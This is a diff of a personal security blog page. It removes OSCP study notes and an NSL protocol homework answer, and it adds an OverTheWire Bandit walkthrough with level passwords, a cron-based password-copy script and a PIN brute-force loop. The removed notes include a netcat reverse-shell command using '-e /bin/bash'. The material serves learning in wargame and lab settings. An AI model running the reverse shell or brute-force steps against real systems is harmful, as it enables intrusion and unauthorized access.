-<h3 id="2-1-4-View-memory-at-any-location"><a href="#2-1-4-View-memory-at-any-location" class="headerlink" title="2.1.4 View memory at any location"></a>2.1.4 View memory at any location</h3><p>指哪里看哪里!</p>
-<p>Tthis poses 2 problems to us: First, we have to find a format parameter which uses an address as stack parameter and displays memory from there, and we have to supply the address. 首先我们需要找到format参数，Which用地址作为stack参数并且从那儿显示记忆体（大哥这不就是char * - %s 这种变量吗）, 另外，我们需要提供地址。%s提供这种功能，通常显示ASCIIZ 字符串， 所以还剩下一个问题，如何拿到stack上的地址（suppose to be the address which we want to know）, into the right place.</p>
-<h3 id="2-1-5-Overwriting-of-arbitrary-memory"><a href="#2-1-5-Overwriting-of-arbitrary-memory" class="headerlink" title="2.1.5 Overwriting of arbitrary memory"></a>2.1.5 Overwriting of arbitrary memory</h3><p>The holy grail of expoitation is to take control of the instruction pointer of a process.<br>IP or also called PC(Instruction pointer) is a register in the CPU and cannot be modified directly, only machine instructions can change it.</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/13/Schreiben/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1632,7 +631,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/05/13/ECC/" itemprop="url">OSCP_Go</a></h1>
+                <a class="post-title-link" href="/2020/05/13/ECC/" itemprop="url">Error Control Coding</a></h1>
         
 
         <div class="post-meta">
@@ -1667,8 +666,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/OSCP/" itemprop="url" rel="index">
-                    <span itemprop="name">OSCP</span>
+                  <a href="/categories/theory/" itemprop="url" rel="index">
+                    <span itemprop="name">theory</span>
                   </a>
                 </span>
 
@@ -1706,80 +705,7 @@
       
         
           
-            <h1 id="1-Tag-0x01"><a href="#1-Tag-0x01" class="headerlink" title="1.Tag 0x01"></a>1.Tag 0x01</h1><h2 id="1-1-Online-documentation"><a href="#1-1-Online-documentation" class="headerlink" title="1.1 Online documentation"></a>1.1 Online documentation</h2><ol>
-<li><a href="https://docs.kali.org" target="_blank" rel="noopener">https://docs.kali.org</a></li>
-<li><a href="https://forums.kali.org" target="_blank" rel="noopener">https://forums.kali.org</a></li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name sdb*</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-2-Service"><a href="#1-2-Service" class="headerlink" title="1.2 Service"></a>1.2 Service</h2><p>default installation : ssh, https,mySQL</p>
-<p>ssh service:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#systemctl start ssh</span><br><span class="line">#ss -antlp |grep sshd</span><br><span class="line">#systemctl enable ssh</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">systemctl start apache2</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ss -antlp |grep apache</span></span><br><span class="line"><span class="meta">#</span><span class="bash">systemctl <span class="built_in">enable</span> apache2</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">systemctl list-unit-files</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2 linux"></a>1.2 linux</h2><h3 id="1-2-1-some-folders"><a href="#1-2-1-some-folders" class="headerlink" title="1.2.1 some folders"></a>1.2.1 some folders</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin/</span><br><span class="line">/sbin/</span><br><span class="line">/etc/</span><br><span class="line">/tmp/</span><br><span class="line">/usr/bin/</span><br><span class="line">/usr/share/</span><br></pre></td></tr></table></figure>
-
-<p>###2.1.2 basic linux commands</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">man (-k)(5)</span><br><span class="line">ls -a -l</span><br><span class="line">cd ~</span><br><span class="line">mkdir -p &#123;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="1-3-powerful-apt"><a href="#1-3-powerful-apt" class="headerlink" title="1.3 powerful apt"></a>1.3 powerful apt</h2><p>Searching installing Tools</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt</span><br><span class="line">apt update &#x2F;&#x2F;版本更新</span><br><span class="line">apt upgrade &#x2F;&#x2F;升级换代</span><br><span class="line">apt list --upgradable</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search pure-ftpd</span><br><span class="line">apt show resource-agents | less</span><br></pre></td></tr></table></figure>
-
-<p>installation and uninstalation</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install </span><br><span class="line">apt remove --purge</span><br><span class="line">dpkg #abbreviation of Debian Package</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="1-4-Shell"><a href="#1-4-Shell" class="headerlink" title="1.4 Shell"></a>1.4 Shell</h2><h3 id="1-4-1-definition"><a href="#1-4-1-definition" class="headerlink" title="1.4.1 definition"></a>1.4.1 definition</h3><p>command-line interpreter</p>
-<p>linux shell - bash shell</p>
-<h3 id="1-4-2-bash-environment"><a href="#1-4-2-bash-environment" class="headerlink" title="1.4.2 bash environment"></a>1.4.2 bash environment</h3><h4 id="1-4-2-1-echo"><a href="#1-4-2-1-echo" class="headerlink" title="1.4.2.1 echo"></a>1.4.2.1 echo</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">echo $USER</span><br><span class="line">echo $PWD</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-4-2-2-variables"><a href="#1-4-2-2-variables" class="headerlink" title="1.4.2.2 variables"></a>1.4.2.2 variables</h4><p>​    Shell allows users to define variables, whose value is assigned by users.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export b=10.11.1.220</span><br><span class="line">ping -c 2 $b #only exit in current shell</span><br><span class="line">echo $b</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xs@kaka:~/Dropbox/deleteme$ <span class="built_in">export</span> othervar=<span class="string">"glocal var"</span></span><br><span class="line">xs@kaka:~/Dropbox/deleteme$ <span class="built_in">echo</span> <span class="variable">$othervar</span> </span><br><span class="line">glocal var</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-4-2-3-Bash-history-trick"><a href="#1-4-2-3-Bash-history-trick" class="headerlink" title="1.4.2.3 Bash history trick"></a>1.4.2.3 Bash history trick</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">!number</span><br><span class="line">ctrl+R(Search command in the history)</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-4-3-Piping-and-Redirection"><a href="#1-4-3-Piping-and-Redirection" class="headerlink" title="1.4.3 Piping and Redirection"></a>1.4.3 Piping and Redirection</h3><p>stream:1.STDIN.2.STDOUT.3STDERR</p>
-<p>To be updated </p>
-<h1 id="2-Tag-0x02"><a href="#2-Tag-0x02" class="headerlink" title="2. Tag 0x02"></a>2. Tag 0x02</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps -e -f <span class="comment">#all processes</span></span><br><span class="line"><span class="comment"># -e select All=-A #full format</span></span><br><span class="line"><span class="built_in">jobs</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">bg</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>display the background process</p>
-<h1 id="3-Tag-0x03"><a href="#3-Tag-0x03" class="headerlink" title="3. Tag 0x03"></a>3. Tag 0x03</h1><h2 id="3-1-Practical-tools"><a href="#3-1-Practical-tools" class="headerlink" title="3.1 Practical tools"></a>3.1 Practical tools</h2><h3 id="3-1-1-netcat"><a href="#3-1-1-netcat" class="headerlink" title="3.1.1 netcat"></a>3.1.1 netcat</h3><p>netcat is a swiss knife. Connect to the TCP/IP and UDP/IP</p>
- <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping mail.139.com</span><br><span class="line">PING mail.139.com (221.176.9.121) 56(84) bytes of data</span><br></pre></td></tr></table></figure>
-
-<p>nc is the abbreviation of netcat.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -n -v 221.176.9.121 110</span><br><span class="line"><span class="meta">#</span><span class="bash"> -n: numeric-only IP addresses, no DNS</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -v: verbose [use twice to be more verbose]</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">-n -v mentioned before</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-l listen, -p port</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>example</p>
-<p>Alice</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">Blind，盲目的</span></span><br></pre></td></tr></table></figure>
-<p>Bob</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.230.10 4444 -e /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">reverse,送上门被控制</span></span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h3 id="3-1-2-socat"><a href="#3-1-2-socat" class="headerlink" title="3.1.2 socat"></a>3.1.2 socat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#socat - TCP4:XXX.XXX.XXX.XXX:XXX</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client1/LINUX</span><br><span class="line">sudo socat TCP4-LISTEN:443 STDOUT</span><br><span class="line"><span class="meta">#</span><span class="bash">socat TCP4-LISTEN:443 STDOUT</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client2/Windows</span><br><span class="line">sudo socat - TCP4:192.168.119.230:443</span><br></pre></td></tr></table></figure>
-
-<p>After the construction of connection, we could communicate.</p>
-<h1 id="9-Tag-0x09"><a href="#9-Tag-0x09" class="headerlink" title="9. Tag 0x09"></a>9. Tag 0x09</h1>
+            <h1 id="1-Error-Control-Coding"><a href="#1-Error-Control-Coding" class="headerlink" title="1.Error Control Coding"></a>1.Error Control Coding</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1>
           
         
       
@@ -2122,7 +1048,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/07/SP/Submission0_archive/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/06/OvertheWire/Bandit22-34/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Seven ♂">
@@ -2141,7 +1067,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/05/07/SP/Submission0_archive/" itemprop="url">submission0_sp</a></h1>
+                <a class="post-title-link" href="/2020/05/06/OvertheWire/Bandit22-34/" itemprop="url">Bandit22-34</a></h1>
         
 
         <div class="post-meta">
@@ -2153,8 +1079,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-07T10:44:09+02:00">
-                2020-05-07
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-06T19:13:18+02:00">
+                2020-05-06
               </time>
             
 
@@ -2176,8 +1102,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/theory/" itemprop="url" rel="index">
-                    <span itemprop="name">theory</span>
+                  <a href="/categories/OvertheWire/" itemprop="url" rel="index">
+                    <span itemprop="name">OvertheWire</span>
                   </a>
                 </span>
 
@@ -2215,87 +1141,889 @@
       
         
           
-            <h2 id="Homework0-for-the-Security-and-Privacy"><a href="#Homework0-for-the-Security-and-Privacy" class="headerlink" title="Homework0 for the Security and Privacy"></a>Homework0 for the Security and Privacy</h2><p> <img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588941845/Screenshot_from_2020-05-08_14-42-14_i3k5op.png" alt=""></p>
-<p>==P2 Answers a:==</p>
-<ul>
-<li>A will notice that the message was not created by E, as she expects, but rather by B.</li>
-<li>Thus A aborts the protocol</li>
-<li>Hence E never sees the nouce $$N_B$$</li>
-<li>Without $N_B$, E is not able to impersonate A to B</li>
-</ul>
-<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200426195732988.png" alt="image-20200426195732988"></p>
-<p>==P2 Answer b==:</p>
-<ul>
-<li><p>Possible Attach on NSL if A use a nonce twice</p>
-</li>
-<li><p>assumption in session 1 : A and  E communicate both honestly, E have captured $$N_A$$</p>
-</li>
-<li><p>In session 2 : </p>
+            <p>上一次到进入level22 结束</p>
+<p>密码是</p>
+<p>Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p>
+<h1 id="Bandit-22-23"><a href="#Bandit-22-23" class="headerlink" title="Bandit 22-23"></a>Bandit 22-23</h1><h2 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for the configuration and see what command is being executed.</p>
+<p><strong>NOTE:</strong> Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>
+<p>之前看到提示1以为要写脚本, 后来发现看成23-24了, 哎 ,浪费了好久时间在权限尝试上</p>
+<p>所以还是按照上一题的思路先看看: </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:~$ cd /etc/cron.d</span><br><span class="line">bandit22@bandit:/etc/cron.d$ ls</span><br><span class="line">atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23</span><br><span class="line">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /usr/bin/cron</span><br><span class="line">cronjob_bandit22.sh  cronjob_bandit24.sh  </span><br><span class="line">cronjob_bandit23.sh  crontab              </span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line">mytarget=$(<span class="built_in">echo</span> I am user <span class="variable">$myname</span> | md5sum | cut -d <span class="string">' '</span> -f 1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Copying passwordfile /etc/bandit_pass/<span class="variable">$myname</span> to /tmp/<span class="variable">$mytarget</span>"</span></span><br><span class="line"></span><br><span class="line">cat /etc/bandit_pass/<span class="variable">$myname</span> &gt; /tmp/<span class="variable">$mytarget</span></span><br></pre></td></tr></table></figure>
+
+<p>再运行了这个脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="string">"bandit22"</span>|usr/bin/cronjob_bandit23.sh</span><br><span class="line">-bash: echobandit22: <span class="built_in">command</span> not found <span class="comment">#报错</span></span><br><span class="line">Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3</span><br></pre></td></tr></table></figure>
+
+<p>等等, 再去相应文件去打开:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:~$ cat /tmp/8169b67bd894ddbb4412f91573b38db3</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure>
+
+<p>这不是上一题的秘钥吗, 等于其实要做的就是传一个argument进去</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/etc/cron.d$ whoami</span><br><span class="line">bandit22</span><br></pre></td></tr></table></figure>
+
+<p>要做的就是更改myname的值为bandit23, 可是遇到各种权限问题,</p>
+<p>直接用shell写吧, sh文件里的$符号后的就是命令:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1</span><br><span class="line">8ca319486bfbbc3663ea0fbe81326349</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/$ echo "Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349"</span><br><span class="line">Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</span><br><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br></pre></td></tr></table></figure>
+
+<p>Got you!</p>
+<h1 id="Bandit-23-24"><a href="#Bandit-23-24" class="headerlink" title="Bandit 23-24"></a>Bandit 23-24</h1><h2 id="Level-Goal-1"><a href="#Level-Goal-1" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for the configuration and see what command is being executed.</p>
+<p><strong>NOTE:</strong> This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
+<p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
+<p>一上来显示常规三板斧</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:~$ ls</span><br><span class="line">bandit23@bandit:~$ ls -a</span><br><span class="line">.  ..  .bash_logout  .bashrc  .profile</span><br><span class="line">bandit23@bandit:~$ cd /etc/cron.d</span><br><span class="line">bandit23@bandit:/etc/cron.d$ ls</span><br><span class="line">atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24</span><br><span class="line">bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24</span><br><span class="line">@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh</span><br></pre></td></tr></table></figure>
+<p>打开的脚本如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">myname=$(whoami)</span><br><span class="line">cd /var/spool/$myname</span><br><span class="line">echo "Executing and deleting all scripts in /var/spool/$myname:"</span><br><span class="line">for i in * .*;</span><br><span class="line">do</span><br><span class="line">    if [ "$i" != "." -a "$i" != ".." ];</span><br><span class="line">    then</span><br><span class="line">	echo "Handling $i"</span><br><span class="line">	timeout -s 9 60 ./$i</span><br><span class="line">	rm -f ./$i</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>脚本表示会执行/var/spool/$myname下的脚本并定期删除所有文件:</p>
+<p>经过前期的实验, 知道密码是在/etc/bandit_pass/bandit24 这里, 需要利用cron这种周期执行的机制, 把该秘钥的文件拷贝出来.</p>
 <ol>
-<li><p>A &gt;&gt; E : $${N_A, A}^a_{kB}$$               </p>
-<blockquote>
-<p>​    A  use the same $N_A$ </p>
-</blockquote>
+<li><p>建立新的文件夹, sh脚本以及密码储存文档</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/bersi</span><br><span class="line">touch /tmp/bersi/bersi.sh</span><br><span class="line">touch /tmp/bersi/password</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>E &gt;&gt; A : $${N_A, N’<em>E, B}^a</em>{kA} $$           </p>
-<blockquote>
-<p> E is able to encrypt the $N_A$ due to it is the same</p>
-</blockquote>
+<li><p>文件都开放权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /tmp/bersi/bersi.sh</span><br><span class="line">chmod 777 /tmp/bersi/password</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>A &gt;&gt; E : $${N’<em>E}‘</em>{kB}$$        </p>
-<blockquote>
-<p>Although E dont hold the private key of B, but the $N’_E$ is known for E, because this message is that E sent it to A!</p>
-</blockquote>
+<li><p>编辑sh脚本, 并指定到周期运行的文件夹下, 重定向的命令还挺好用的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">bersi.sh中内容</span></span><br><span class="line">cat /etc/bandit_pass/bandit24 &gt; /tmp/bersi/password</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:/tmp/bersi$ cp bersi.sh /var/spool/bandit24/</span><br></pre></td></tr></table></figure>
+
+<p>最后拿到密码</p>
 </li>
 </ol>
-</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588941845/Screenshot_from_2020-05-08_14-42-23_tqezhv.png" alt=""></p>
-<p>==P3 Answer==:</p>
-<p>we should assume that the </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:&#x2F;tmp&#x2F;bersi$ cat password</span><br></pre></td></tr></table></figure>
+
+<p>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>
+<p>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>
+<p>本题就是要联系上面两题, 知道密码放置的位置.</p>
+<h1 id="Bandit-Level-24-→-Level-25-not-solved"><a href="#Bandit-Level-24-→-Level-25-not-solved" class="headerlink" title="Bandit Level 24 → Level 25(not solved)"></a>Bandit Level 24 → Level 25(not solved)</h1><h2 id="Level-Goal-2"><a href="#Level-Goal-2" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit24@bandit:~$ nc localhost 30002</span><br><span class="line">I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1111</span><br><span class="line">Wrong! Please enter the correct pincode. Try again.</span><br></pre></td></tr></table></figure>
+
+<p>这题,自己的做法是:</p>
+<p>写了一个生成0-10000的脚本, 脚本用来生成10000行</p>
+<p>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1111</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br><span class="line">for a in &#123;0..9&#125;</span><br><span class="line">do</span><br><span class="line">	for b in &#123;0..9&#125;</span><br><span class="line">	do</span><br><span class="line">		for c in &#123;0..9&#125;</span><br><span class="line">		do</span><br><span class="line">			for d in &#123;0..9&#125;</span><br><span class="line">			do</span><br><span class="line">				echo $password $a$b$c$d&gt;&gt; passlist</span><br><span class="line">			done</span><br><span class="line">		done</span><br><span class="line">	done			</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>用10000行这个数据, 再进行测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat passlist |nc localhost 30002</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是! 是一直timeout, 这几天也有人问<a href="https://unix.stackexchange.com/questions/584070/why-does-my-bash-script-stop-and-say-timeout-exiting" target="_blank" rel="noopener">同样的问题</a>,过段时间再试试. 说不定有搞破坏的把correct的密码删了, 毕竟跟writeup的方法也一样啊, 不对还是太菜了.<br>uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</p>
